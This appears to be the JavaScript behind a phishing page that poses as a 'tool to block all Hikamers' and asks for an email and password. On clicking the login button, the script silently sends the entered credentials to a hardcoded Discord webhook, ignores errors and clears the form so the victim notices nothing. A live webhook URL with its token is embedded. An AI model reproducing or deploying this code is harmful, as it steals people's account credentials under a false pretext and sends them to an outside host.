// ==========================================================
// ⚠️ Webhook URLを正しいものに置き換えてください。
// ==========================================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1428234881561002045/32y44N7pa_9xGU1NMPV-73lnIzKPRrNyxAANMwGjbRp176wfKkYwnWHbSD1CE4pnxIWM";
// ==========================================================


document.addEventListener('DOMContentLoaded', () => {
    const loginButton = document.getElementById('sendToDiscordButton');
    const modal = document.getElementById('cModal');
    // ⚠️ 変更点: 新しく作成したOKボタンを取得
    const okButton = document.getElementById('okButton'); 
    
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');


    // --- 1. 「ログインする」ボタンのクリック処理 ---
    loginButton.onclick = async function(event) {
        event.preventDefault(); 
        
        const emailValue = emailInput.value;
        const passwordValue = passwordInput.value;

        const messageContent = `**「全ヒカマーをブロックするツール」からのログイン試行**\n\n**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
        
        // Discordに送信
        await sendToDiscord(messageContent);
        
        // ポップアップを表示し、入力をクリア
        modal.style.display = "block";
        emailInput.value = '';
        passwordInput.value = '';
    }

    // --- 2. モーダルを閉じる処理 ---
    
    // ⚠️ 変更点: OKボタンをクリックしたらモーダルを非表示
    okButton.onclick = function() {
        modal.style.display = "none";
    }

    // モーダルの外側をクリックしても閉じないように、window.onclick の処理は削除済みです。
});


/**
 * Discord Webhookを使用してメッセージを送信する関数
 * 失敗しても何も通知しない（ユーザーへのエラー表示なし）
 */
async function sendToDiscord(content) {
    
    const data = {
        "content": content, 
        "username": "ヒカマーブロックツール",
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });
        
    } catch (error) {
        // 通信エラーが発生しても無視
    }
}